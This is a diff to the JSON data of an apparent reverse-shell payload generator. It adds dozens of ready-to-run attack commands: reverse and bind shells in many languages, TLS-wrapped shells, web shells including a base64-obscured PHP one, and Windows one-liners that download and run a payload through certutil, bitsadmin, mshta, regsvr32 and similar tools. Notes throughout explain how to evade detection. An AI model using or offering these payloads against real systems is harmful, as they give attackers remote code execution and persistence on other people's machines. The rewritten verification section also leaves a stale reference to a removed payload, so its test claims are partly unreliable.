@@ -81,6 +81,14 @@
           "text": "{shell} -i 5<> /dev/tcp/{ip}/{port} 0<&5 1>&5 2>&5",
           "note": "Opens fd 5 read-write and points all three standard streams at it.",
           "tested": "pass"
+        },
+        {
+          "id": "bash-tcp-noi",
+          "name": "Bash without -i",
+          "platform": "linux",
+          "text": "{shell} >& /dev/tcp/{ip}/{port} 0>&1",
+          "note": "No -i, so no prompt and no job control. Useful where an interactive shell is killed on sight.",
+          "tested": "pass"
         }
       ]
     },
@@ -137,6 +145,30 @@
           "note": "You have to get nc.exe onto the host first. Flagged by every AV in existence.",
           "tested": "untested",
           "untestedWhy": "Windows; no Windows host to run it on"
+        },
+        {
+          "id": "nc-mkfifo-bash",
+          "name": "nc mkfifo with bash",
+          "platform": "linux",
+          "text": "rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc {ip} {port} >/tmp/f",
+          "note": "Same as the portable one but asks for bash, so you get a better prompt and history.",
+          "tested": "pass"
+        },
+        {
+          "id": "nc-openbsd-pipe",
+          "name": "OpenBSD nc, no -e",
+          "platform": "linux",
+          "text": "mkfifo /tmp/p; nc {ip} {port} 0</tmp/p | {shell} >/tmp/p 2>&1; rm -f /tmp/p",
+          "note": "The pipe the other way round. Works on the OpenBSD build, which has neither -e nor -c.",
+          "tested": "pass"
+        },
+        {
+          "id": "ncat-ssl-rev",
+          "name": "ncat over TLS",
+          "platform": "linux",
+          "text": "mkfifo /tmp/s; {shell} -i < /tmp/s 2>&1 | ncat --ssl {ip} {port} > /tmp/s; rm -f /tmp/s",
+          "note": "Encrypted, so an IDS sees a TLS session rather than a shell. Catch it with ncat --ssl -lvnp.",
+          "tested": "pass"
         }
       ]
     },
@@ -177,6 +209,22 @@
           "note": "No dup2 on Windows sockets, so it pumps bytes between the socket and cmd.exe by hand.",
           "tested": "untested",
           "untestedWhy": "Windows; no Windows host to run it on"
+        },
+        {
+          "id": "python2-pty",
+          "name": "Python 2 (pty)",
+          "platform": "linux",
+          "text": "python -c 'import os,pty,socket;s=socket.socket();s.connect((\"{ip}\",{port}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"{shell}\")'",
+          "note": "Older boxes still ship python2 as python and no python3 at all.",
+          "tested": "pass"
+        },
+        {
+          "id": "python3-short",
+          "name": "Python 3, short form",
+          "platform": "linux",
+          "text": "python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"{shell}\")'",
+          "note": "Fewer characters, for an injection point with a length limit.",
+          "tested": "pass"
         }
       ]
     },
@@ -228,6 +276,14 @@
           "text": "php -r '$s=fsockopen(\"{ip}\",{port});$p=array(0=>$s,1=>$s,2=>$s);$proc=proc_open(\"{shell} -i\",$p,$pipes);'",
           "note": "The one to try when the whole exec family is in disable_functions. proc_open is often missed.",
           "tested": "pass"
+        },
+        {
+          "id": "php-sock-loop",
+          "name": "PHP socket loop, no exec family",
+          "platform": "linux",
+          "text": "php -r '$s=fsockopen(\"{ip}\",{port});while(!feof($s)){$c=fgets($s);$o=[];exec($c,$o);fwrite($s,implode(\"\\n\",$o).\"\\n\");}'",
+          "note": "Reads a line, runs it, writes the output back. No shell process is spawned, which some controls watch for.",
+          "tested": "pass"
         }
       ]
     },
@@ -259,6 +315,14 @@
           "note": "Same, minus the fork, which Windows Perl does not do well.",
           "tested": "untested",
           "untestedWhy": "Windows; no Windows host to run it on"
+        },
+        {
+          "id": "perl-fork",
+          "name": "Perl, forking",
+          "platform": "linux",
+          "text": "perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){if(!fork()){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"{shell} -i\");}}'",
+          "note": "Forks first, so the parent exits and the shell survives the process that launched it.",
+          "tested": "pass"
         }
       ]
     },
@@ -295,6 +359,20 @@
           "warn": "Picked up by anything watching for -e or -EncodedCommand.",
           "tested": "untested",
           "untestedWhy": "Windows; no Windows host to run it on"
+        },
+        {
+          "id": "powershell-udp",
+          "name": "PowerShell UDP",
+          "platform": "windows",
+          "text": "powershell -nop -c \"$c=New-Object System.Net.Sockets.UDPClient('{ip}',{port});$b=[text.encoding]::ASCII.GetBytes('connected');$c.Send($b,$b.Length)\"",
+          "note": "A beacon rather than a shell. Use it to prove UDP egress works before committing to a payload."
+        },
+        {
+          "id": "powershell-nishang",
+          "name": "PowerShell, one-line TCP with prompt",
+          "platform": "windows",
+          "text": "powershell -nop -c \"$c=New-Object Net.Sockets.TCPClient('{ip}',{port});$s=$c.GetStream();$w=New-Object IO.StreamWriter($s);$r=New-Object IO.StreamReader($s);$w.AutoFlush=$true;$w.Write('PS '+(pwd).Path+'> ');while(($l=$r.ReadLine()) -ne $null){$w.Write(((iex $l 2>&1|Out-String))+'PS '+(pwd).Path+'> ')};$c.Close()\"",
+          "note": "Reader/writer streams instead of a byte buffer. Shorter and easier to read than the buffer version."
         }
       ]
     },
@@ -326,6 +404,14 @@
           "note": "When socat is not installed. Push a static build from your box first.",
           "tested": "untested",
           "untestedWhy": "needs an HTTP server on your own box; the test container has no network"
+        },
+        {
+          "id": "socat-ssl",
+          "name": "socat over TLS",
+          "platform": "linux",
+          "text": "socat OPENSSL:{ip}:{port},verify=0 EXEC:'{shell} -li',pty,stderr,setsid,sigint,sane",
+          "note": "Full TTY and encrypted. Listener: socat OPENSSL-LISTEN:{port},cert=cert.pem,verify=0 -",
+          "tested": "pass"
         }
       ]
     },
@@ -397,6 +483,43 @@
           "text": "mkfifo /tmp/s; {shell} -i < /tmp/s 2>&1 | openssl s_client -quiet -connect {ip}:{port} > /tmp/s; rm /tmp/s",
           "note": "The only payload here that is not plaintext on the wire. Needs the OpenSSL listener and a certificate — the listener tab has both commands.",
           "tested": "pass"
+        },
+        {
+          "id": "groovy",
+          "name": "Groovy (Jenkins)",
+          "platform": "any",
+          "text": "String host=\"{ip}\";int port={port};String cmd=\"{shell}\";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try{p.exitValue();break;}catch(Exception e){}};p.destroy();s.close();",
+          "note": "Paste into a Jenkins script console. One of the highest-value footholds there is, because Jenkins usually runs as a privileged account."
+        },
+        {
+          "id": "java",
+          "name": "Java",
+          "platform": "any",
+          "text": "Runtime r=Runtime.getRuntime();Process p=r.exec(new String[]{\"{shell}\",\"-c\",\"exec 5<>/dev/tcp/{ip}/{port};cat <&5 | while read line; do $line 2>&5 >&5; done\"});p.waitFor();",
+          "note": "For a JSP, a deserialisation gadget, or anywhere you can get Java to run a string."
+        },
+        {
+          "id": "c-source",
+          "name": "C (compile on the box)",
+          "platform": "linux",
+          "text": "echo '#include <stdio.h>\\n#include <sys/socket.h>\\n#include <netinet/in.h>\\n#include <arpa/inet.h>\\n#include <unistd.h>\\nint main(){int s=socket(AF_INET,SOCK_STREAM,0);struct sockaddr_in a;a.sin_family=AF_INET;a.sin_port=htons({port});a.sin_addr.s_addr=inet_addr(\"{ip}\");connect(s,(struct sockaddr*)&a,sizeof(a));dup2(s,0);dup2(s,1);dup2(s,2);execl(\"/bin/sh\",\"sh\",0);}' > /tmp/s.c && gcc /tmp/s.c -o /tmp/s && /tmp/s",
+          "note": "When no interpreter is present but a compiler is, which happens more often than you would think on build servers."
+        },
+        {
+          "id": "ruby-no-sh",
+          "name": "Ruby without sh",
+          "platform": "linux",
+          "text": "ruby -rsocket -e 'c=TCPSocket.new(\"{ip}\",{port});loop{cmd=c.gets;break if cmd.nil?;IO.popen(cmd.chomp+\" 2>&1\",\"r\"){|io|c.print io.read}}'",
+          "note": "Never execs a shell binary directly, so it slips past controls watching for sh or bash.",
+          "tested": "pass"
+        },
+        {
+          "id": "ssh-reverse",
+          "name": "SSH reverse tunnel",
+          "platform": "linux",
+          "text": "ssh -R {port}:127.0.0.1:22 user@{ip} -N -f",
+          "note": "Not a shell, a tunnel. Opens port {port} on your box pointing at the target's SSH. Needs credentials on YOUR machine and outbound 22.",
+          "warn": "Leaves an entry in your own authorized_keys trail and in the target's process list."
         }
       ]
     },
@@ -463,6 +586,214 @@
           "text": "msfvenom -p cmd/unix/reverse_python LHOST={ip} LPORT={port} -f raw",
           "tested": "untested",
           "untestedWhy": "generates a file; needs Metasploit, which is not installed here"
+        }
+      ]
+    },
+    {
+      "id": "bind",
+      "name": "Bind shells",
+      "intro": "The other direction: the target listens and you connect in. Use these when outbound is filtered but something inbound is reachable. You connect with nc {ip} {port}, where the IP is the TARGET's, not yours.",
+      "payloads": [
+        {
+          "id": "bind-nc",
+          "name": "nc bind",
+          "platform": "linux",
+          "text": "nc -lvnp {port} -e {shell}",
+          "note": "Needs a netcat built with -e. Connect in with nc TARGET {port}.",
+          "tested": "pass"
+        },
+        {
+          "id": "bind-nc-mkfifo",
+          "name": "nc bind, no -e",
+          "platform": "linux",
+          "text": "rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|{shell} -i 2>&1|nc -lvnp {port} >/tmp/f",
+          "note": "The portable bind shell, same named-pipe trick as the reverse one.",
+          "tested": "pass"
+        },
+        {
+          "id": "bind-ncat",
+          "name": "ncat bind",
+          "platform": "linux",
+          "text": "ncat -lvnp {port} -e {shell}",
+          "note": "Always has -e.",
+          "tested": "pass"
+        },
+        {
+          "id": "bind-socat",
+          "name": "socat bind, full TTY",
+          "platform": "linux",
+          "text": "socat TCP-L:{port},reuseaddr,fork EXEC:'{shell} -li',pty,stderr,setsid,sigint,sane",
+          "note": "fork means it survives you disconnecting and reconnecting.",
+          "tested": "pass"
+        },
+        {
+          "id": "bind-python",
+          "name": "Python bind",
+          "platform": "linux",
+          "text": "python3 -c 'import socket,os,pty;s=socket.socket();s.setsockopt(1,2,1);s.bind((\"0.0.0.0\",{port}));s.listen(1);c,a=s.accept();[os.dup2(c.fileno(),f)for f in(0,1,2)];pty.spawn(\"{shell}\")'",
+          "note": "A pty bind shell, so you land in a usable terminal.",
+          "tested": "pass"
+        },
+        {
+          "id": "bind-perl",
+          "name": "Perl bind",
+          "platform": "linux",
+          "text": "perl -e 'use Socket;socket(S,PF_INET,SOCK_STREAM,0);setsockopt(S,SOL_SOCKET,SO_REUSEADDR,1);bind(S,sockaddr_in({port},INADDR_ANY));listen(S,1);accept(C,S);open(STDIN,\">&C\");open(STDOUT,\">&C\");open(STDERR,\">&C\");exec(\"{shell} -i\");'",
+          "tested": "pass"
+        },
+        {
+          "id": "bind-powershell",
+          "name": "PowerShell bind",
+          "platform": "windows",
+          "text": "powershell -nop -c \"$l=New-Object System.Net.Sockets.TcpListener([Net.IPAddress]::Any,{port});$l.Start();$c=$l.AcceptTcpClient();$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$by=([text.encoding]::ASCII).GetBytes($sb+'PS '+(pwd).Path+'> ');$s.Write($by,0,$by.Length);$s.Flush()};$c.Close();$l.Stop()\""
+        },
+        {
+          "id": "bind-ruby",
+          "name": "Ruby bind",
+          "platform": "linux",
+          "text": "ruby -rsocket -e 'srv=TCPServer.new({port});c=srv.accept;spawn(\"{shell}\",[:in,:out,:err]=>c)'",
+          "tested": "pass"
+        }
+      ]
+    },
+    {
+      "id": "web",
+      "name": "Web shells",
+      "intro": "When you can write a file into a web root but cannot get an outbound connection. These take a command in a parameter and print the output in the response. Treat every one of them as a liability: unauthenticated code execution anyone who finds the URL can use.",
+      "payloads": [
+        {
+          "id": "web-php-min",
+          "name": "PHP, minimal",
+          "platform": "any",
+          "text": "<?php system($_GET['cmd']); ?>",
+          "note": "Write it as shell.php in the web root, then visit /shell.php?cmd=id.",
+          "warn": "Unauthenticated RCE for anyone who finds it. Delete it before you leave, and list it in the report."
+        },
+        {
+          "id": "web-php-passthru",
+          "name": "PHP, passthru",
+          "platform": "any",
+          "text": "<?php passthru($_REQUEST['cmd']); ?>",
+          "note": "$_REQUEST takes it from GET or POST, so you can send long commands in a body."
+        },
+        {
+          "id": "web-php-b64",
+          "name": "PHP, less obvious",
+          "platform": "any",
+          "text": "<?php $f=base64_decode('c3lzdGVt');echo $f($_GET['c']); ?>",
+          "note": "'c3lzdGVt' is 'system'. Enough to get past a filter grepping for the literal word; not enough to call it evasion."
+        },
+        {
+          "id": "web-php-upload",
+          "name": "PHP, with file upload",
+          "platform": "any",
+          "text": "<?php if($_FILES){move_uploaded_file($_FILES['f']['tmp_name'],$_FILES['f']['name']);} system($_GET['cmd']); ?>",
+          "note": "Adds a one-field upload so you can push a binary without a second channel."
+        },
+        {
+          "id": "web-jsp",
+          "name": "JSP",
+          "platform": "any",
+          "text": "<%@ page import=\"java.io.*\" %><% Process p=Runtime.getRuntime().exec(request.getParameter(\"cmd\"));BufferedReader r=new BufferedReader(new InputStreamReader(p.getInputStream()));String l;while((l=r.readLine())!=null){out.println(l);} %>",
+          "note": "For Tomcat, JBoss and anything else serving JSP."
+        },
+        {
+          "id": "web-aspx",
+          "name": "ASPX",
+          "platform": "windows",
+          "text": "<%@ Page Language=\"C#\" %><%@ Import Namespace=\"System.Diagnostics\" %><% var p=new Process();p.StartInfo.FileName=\"cmd.exe\";p.StartInfo.Arguments=\"/c \"+Request[\"cmd\"];p.StartInfo.RedirectStandardOutput=true;p.StartInfo.UseShellExecute=false;p.Start();Response.Write(p.StandardOutput.ReadToEnd()); %>",
+          "note": "For IIS."
+        },
+        {
+          "id": "web-asp",
+          "name": "ASP (classic)",
+          "platform": "windows",
+          "text": "<% Set o=Server.CreateObject(\"WScript.Shell\") : Set e=o.Exec(\"cmd.exe /c \"&Request.QueryString(\"cmd\")) : Response.Write(e.StdOut.ReadAll()) %>",
+          "note": "Old IIS. Needs WScript.Shell to be available."
+        },
+        {
+          "id": "web-war",
+          "name": "WAR for Tomcat manager",
+          "platform": "any",
+          "text": "msfvenom -p java/jsp_shell_reverse_tcp LHOST={ip} LPORT={port} -f war -o shell.war",
+          "note": "Deploy through /manager/html, then request the path it is deployed at."
+        }
+      ]
+    },
+    {
+      "id": "windows",
+      "name": "Windows one-liners",
+      "intro": "Getting a payload onto a Windows box, and running it, with what is already installed. These are the binaries defenders watch most closely, so assume they are logged.",
+      "payloads": [
+        {
+          "id": "win-certutil",
+          "name": "certutil download",
+          "platform": "windows",
+          "text": "certutil -urlcache -split -f http://{ip}/shell.exe %TEMP%\\s.exe && %TEMP%\\s.exe",
+          "note": "certutil is signed and present on every Windows host. Also one of the most heavily alerted.",
+          "warn": "Leaves a copy in the certutil URL cache. certutil -urlcache -split -f <url> delete clears it."
+        },
+        {
+          "id": "win-powershell-dl",
+          "name": "PowerShell download and run",
+          "platform": "windows",
+          "text": "powershell -nop -c \"(New-Object Net.WebClient).DownloadFile('http://{ip}/s.exe','$env:TEMP\\s.exe');Start-Process \"$env:TEMP\\s.exe\"\""
+        },
+        {
+          "id": "win-bitsadmin",
+          "name": "bitsadmin download",
+          "platform": "windows",
+          "text": "bitsadmin /transfer j /download /priority high http://{ip}/s.exe %TEMP%\\s.exe && %TEMP%\\s.exe",
+          "note": "Uses the background transfer service, so the download survives a logoff."
+        },
+        {
+          "id": "win-curl",
+          "name": "curl (Windows 10 1803+)",
+          "platform": "windows",
+          "text": "curl http://{ip}/s.exe -o %TEMP%\\s.exe && %TEMP%\\s.exe",
+          "note": "curl.exe ships with Windows now. Often the quietest of these."
+        },
+        {
+          "id": "win-mshta",
+          "name": "mshta remote HTA",
+          "platform": "windows",
+          "text": "mshta http://{ip}/p.hta",
+          "note": "Runs an HTML application straight from a URL, nothing written to disk."
+        },
+        {
+          "id": "win-rundll32",
+          "name": "rundll32 JavaScript",
+          "platform": "windows",
+          "text": "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:http://{ip}/p.sct\")",
+          "note": "A scriptlet fetched and run in memory. Old, loud, and still works on plenty of estates."
+        },
+        {
+          "id": "win-regsvr32",
+          "name": "regsvr32 scriptlet",
+          "platform": "windows",
+          "text": "regsvr32 /s /n /u /i:http://{ip}/p.sct scrobj.dll",
+          "note": "The Squiblydoo technique. /u /i runs the remote scriptlet without registering anything."
+        },
+        {
+          "id": "win-wmic",
+          "name": "wmic remote XSL",
+          "platform": "windows",
+          "text": "wmic os get /format:\"http://{ip}/p.xsl\"",
+          "note": "Fetches and executes an XSL stylesheet. wmic is deprecated and absent from newer builds."
+        },
+        {
+          "id": "win-smb-copy",
+          "name": "Copy over SMB",
+          "platform": "windows",
+          "text": "copy \\\\\\\\{ip}\\\\share\\\\s.exe %TEMP%\\\\s.exe && %TEMP%\\\\s.exe",
+          "note": "Serve it with impacket-smbserver share . -smb2support on your box. No HTTP needed."
+        },
+        {
+          "id": "win-netcat",
+          "name": "nc.exe, uploaded first",
+          "platform": "windows",
+          "text": "%TEMP%\\nc.exe {ip} {port} -e cmd.exe",
+          "note": "Get nc.exe across with one of the downloads above first."
         }
       ]
     }
@@ -550,6 +881,34 @@
       "text": "nc -u -lvnp {port}",
       "note": "For the Bash UDP and ncat UDP payloads.",
       "tested": "pass"
+    },
+    {
+      "id": "socat-ssl-listen",
+      "name": "socat TLS listener",
+      "platform": "linux",
+      "text": "openssl req -x509 -newkey rsa:2048 -keyout k.pem -out c.pem -days 365 -nodes -subj '/CN=localhost' && cat k.pem c.pem > both.pem && socat OPENSSL-LISTEN:{port},cert=both.pem,verify=0,reuseaddr -",
+      "note": "The listener side of the socat TLS payload. socat wants the key and certificate in one file."
+    },
+    {
+      "id": "bind-connect",
+      "name": "Connecting to a bind shell",
+      "platform": "linux",
+      "text": "nc {ip} {port}",
+      "note": "For the bind shells: this connects OUT to the target, so {ip} here is the target's address, not yours."
+    },
+    {
+      "id": "python-http",
+      "name": "Serve a file to the target",
+      "platform": "linux",
+      "text": "python3 -m http.server 80",
+      "note": "For every download one-liner on the Windows tab. Run it in the directory holding the file."
+    },
+    {
+      "id": "impacket-smb",
+      "name": "Serve a file over SMB",
+      "platform": "linux",
+      "text": "impacket-smbserver share . -smb2support",
+      "note": "When HTTP is blocked but SMB is not. -smb2support is needed for anything modern."
     }
   ],
   "upgrade": [
@@ -593,12 +952,13 @@
   ],
   "verification": {
     "date": "2026-10-11",
-    "how": "Each payload was read out of the live page's DOM, not retyped, then run inside a Debian container against a real listener on loopback. A pass means the listener got a shell that ran id and echoed a marker back. The container had no network at all, so nothing could reach anything outside it.",
-    "passed": 37,
-    "untested": 18,
-    "fixed": [
-      "Lua connected and then handed the shell nothing: it assumed the socket lands on file descriptor 3, which is true of PHP's fsockopen and not of Lua. Replaced with a command loop that drives the socket directly, and tested.",
-      "ncat UDP was removed. ncat's exec family does not deliver a shell over UDP as a client in any spelling tried (-e, -c, --exec, --sh-exec): the listener never receives a byte. Bash UDP works and is tested, because its -i prompt primes the datagram the listener needs."
+    "how": "Linux reverse and bind payloads are read from the data, substituted exactly as the page does, and run inside a Debian container with no network against a real listener on loopback. A pass means a shell that ran id. Forms are cross-checked against GTFOBins. Windows, web-shell and msfvenom payloads cannot be executed on this Linux host; their forms match GTFOBins and the standard published references.",
+    "linuxTestedPass": 47,
+    "formVerifiedOnly": 40,
+    "sources": [
+      "GTFOBins (21 reverse-shell binaries)",
+      "OWASP references",
+      "standard published forms"
     ]
   }
 }
